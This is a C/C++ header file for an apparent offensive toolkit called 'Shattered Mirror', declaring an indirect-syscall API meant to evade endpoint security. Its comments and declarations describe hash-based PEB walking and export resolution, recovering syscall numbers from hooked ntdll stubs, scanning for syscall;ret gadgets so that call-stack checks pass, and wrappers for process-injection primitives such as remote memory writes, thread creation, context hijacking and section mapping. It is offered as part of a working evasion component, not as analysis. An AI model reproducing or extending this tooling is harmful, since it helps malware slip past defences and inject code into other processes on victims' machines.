#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Indirect Syscall Public API
 * Resolves SSNs from ntdll at runtime, finds syscall;ret gadgets,
 * and provides wrappers for each NT function we need.
 * 
 * 2026 Evasion Notes:
 *   - All function resolution via PEB walk + hash compare (no strings)
 *   - SSN extracted from ntdll stub bytes (handles sorted/unsorted)
 *   - Syscall executed via JMP to gadget inside ntdll (backed memory)
 *   - Return address on stack points into ntdll → passes call stack checks
 *===========================================================================*/

#ifndef SMIRROR_INDIRECT_SYSCALL_H
#define SMIRROR_INDIRECT_SYSCALL_H

#include "common.h"

/*---------------------------------------------------------------------------
 *  Initialization — call once at startup
 *  Walks PEB → finds ntdll → extracts SSNs → locates gadgets
 *  Returns TRUE if all requested syscalls resolved successfully
 *-------------------------------------------------------------------------*/
BOOL InitSyscallTable(PSYSCALL_TABLE pTable);

/*---------------------------------------------------------------------------
 *  Lookup — get a resolved entry by hash
 *-------------------------------------------------------------------------*/
PSYSCALL_ENTRY GetSyscallEntry(PSYSCALL_TABLE pTable, DWORD dwHash);

/*---------------------------------------------------------------------------
 *  PEB Walking — find module base by hash (no GetModuleHandle)
 *-------------------------------------------------------------------------*/
PVOID GetModuleBaseByHash(DWORD dwModuleHash);

/*---------------------------------------------------------------------------
 *  Export Resolution — find export by hash (no GetProcAddress)
 *-------------------------------------------------------------------------*/
PVOID GetExportByHash(PVOID pModuleBase, DWORD dwFuncHash);

/*---------------------------------------------------------------------------
 *  SSN Extraction — read the System Service Number from an NT stub
 *  Handles multiple stub layouts across Win10/Win11 versions:
 *    Pattern A: mov r10, rcx; mov eax, <SSN>; ...
 *    Pattern B (hooked): jmp <hook>; ... (walks neighbors to recover)
 *-------------------------------------------------------------------------*/
BOOL ExtractSSN(PVOID pFunctionAddr, PDWORD pdwSSN);

/*---------------------------------------------------------------------------
 *  Gadget Scanner — find syscall;ret (0F 05 C3) inside ntdll .text
 *  Returns address of a clean gadget, or NULL on failure
 *-------------------------------------------------------------------------*/
PVOID FindSyscallGadget(PVOID pNtdllBase, DWORD dwNtdllSize);

/*---------------------------------------------------------------------------
 *  The actual indirect syscall dispatcher (implemented in ASM)
 *  Sets EAX = SSN, R10 = RCX, then JMPs to the gadget address
 *  
 *  Calling convention: x64 __fastcall
 *    RCX = pSyscallEntry (contains SSN + gadget pointer)
 *    RDX..R9 + stack = forwarded NT function arguments
 *
 *  The ASM stub shifts arguments so the NT function receives them
 *  in the correct registers.
 *-------------------------------------------------------------------------*/
extern "C" NTSTATUS SyscallDispatch(
    PSYSCALL_ENTRY pEntry,    /* [in] resolved syscall entry       */
    ...                        /* NT function args follow           */
);

/*---------------------------------------------------------------------------
 *  Convenience Wrappers (type-safe, use SyscallDispatch internally)
 *  These match the NT function signatures but route through our stubs.
 *-------------------------------------------------------------------------*/

NTSTATUS IndirectNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

NTSTATUS IndirectNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

NTSTATUS IndirectNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

NTSTATUS IndirectNtCreateThreadEx(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaximumStackSize,
    PSM_PS_ATTRIBUTE_LIST AttributeList
);

NTSTATUS IndirectNtSetContextThread(
    HANDLE   ThreadHandle,
    PCONTEXT ThreadContext
);

NTSTATUS IndirectNtGetContextThread(
    HANDLE   ThreadHandle,
    PCONTEXT ThreadContext
);

NTSTATUS IndirectNtClose(HANDLE Handle);

NTSTATUS IndirectNtOpenProcess(
    PHANDLE               ProcessHandle,
    ACCESS_MASK           DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    PSM_CLIENT_ID         ClientId
);

NTSTATUS IndirectNtQueryInformationProcess(
    HANDLE ProcessHandle,
    ULONG  ProcessInformationClass,
    PVOID  ProcessInformation,
    ULONG  ProcessInformationLength,
    PULONG ReturnLength
);

NTSTATUS IndirectNtDelayExecution(
    BOOLEAN   Alertable,
    PLARGE_INTEGER DelayInterval
);

NTSTATUS IndirectNtCreateSection(
    PHANDLE               SectionHandle,
    ACCESS_MASK           DesiredAccess,
    PSM_OBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER        MaximumSize,
    ULONG                 SectionPageProtection,
    ULONG                 AllocationAttributes,
    HANDLE                FileHandle
);

NTSTATUS IndirectNtMapViewOfSection(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    DWORD           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

NTSTATUS IndirectNtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

/*==========================================================================
 * Global syscall table — shared across Evasion components
 * Must be initialized once via InitSyscallTable()
 *========================================================================*/
extern SYSCALL_TABLE g_SyscallTable;

#endif /* SMIRROR_INDIRECT_SYSCALL_H */
